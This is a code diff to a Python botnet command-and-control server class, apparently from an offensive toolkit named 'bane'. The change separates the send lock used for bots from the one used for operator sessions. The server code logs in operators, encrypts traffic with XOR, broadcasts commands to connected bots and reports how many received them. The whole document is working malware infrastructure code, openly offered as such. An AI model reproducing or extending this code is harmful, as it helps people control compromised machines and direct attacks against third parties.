@@ -11,17 +11,19 @@ class Botnet_C_C_Server:
     password_prompt="\r\npassword: "
     user_prompt="{}@bane-C&C:$"
 
-    def send_data(self,data,sock,xor_key=None,read_output=False):
-        while True:
-            time.sleep(0.1)
-            if self.sending==False:
-                break
-        self.sending=True
+    def send_data(self,data,sock,xor_key=None,read_output=False,is_bot=True):
+        if is_bot==True:
+            while True:
+                time.sleep(0.1)
+                if self.sending_to_bots==False:
+                    break
+            self.sending_to_bots=True
         data='{}'.format(data)
         if xor_key not in [None,''] and data.strip()!='':
             data= XOR.encrypt(data,xor_key)
         sock.send(data.encode())
-        self.sending=False
+        if is_bot==True:
+            self.sending_to_bots=False
         if read_output==True:
             return Botnet_C_C_Server.read_data(sock,xor_key=xor_key)
 
@@ -72,9 +74,9 @@ class Botnet_C_C_Server:
                 dead_bots.append(client_socket)
         for x in dead_bots:
             self.bots_list.remove(x)
-        #self.sending=False
+        #self.sending_to_bots=False
         if is_ping==False:
-            self.send_data('\r\nCommand was sent to {} bots\r\n{}'.format(len(self.bots_list),Botnet_C_C_Server.user_prompt.format(user).strip()).strip(),user_socket,xor_key=self.users_encryption_key)
+            self.send_data('\r\nCommand was sent to {} bots\r\n{}'.format(len(self.bots_list),Botnet_C_C_Server.user_prompt.format(user).strip()).strip(),user_socket,xor_key=self.users_encryption_key,is_bot=False)
 
     def handle_bot(self,client_socket):
         try:
@@ -87,8 +89,8 @@ class Botnet_C_C_Server:
     def handle_user(self,client_socket):
         try:
             banner=Botnet_C_C_Server.banner+Botnet_C_C_Server.username_prompt
-            user=self.send_data(banner,client_socket,xor_key=self.users_encryption_key,read_output=True)
-            pwd=self.send_data(Botnet_C_C_Server.password_prompt,client_socket,xor_key=self.users_encryption_key,read_output=True)
+            user=self.send_data(banner,client_socket,xor_key=self.users_encryption_key,read_output=True,is_bot=False)
+            pwd=self.send_data(Botnet_C_C_Server.password_prompt,client_socket,xor_key=self.users_encryption_key,read_output=True,is_bot=False)
             if self.login(username=user,password=pwd)==True:
                 snd='\r\n\r\nTotal Bots: {}\r\n\r\n{}'.format(len(self.bots_list),Botnet_C_C_Server.user_prompt.format(user).strip())
                 if self.users_encryption_key not in ['',None]:
@@ -116,7 +118,7 @@ class Botnet_C_C_Server:
         self.users_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.users_server.bind((users_host, users_port))
         self.users_server.listen(max_users) 
-        self.sending=False
+        self.sending_to_bots=False
         self.pings_interval=pings_interval
         self.users=users
         self.threads_daemon=threads_daemon
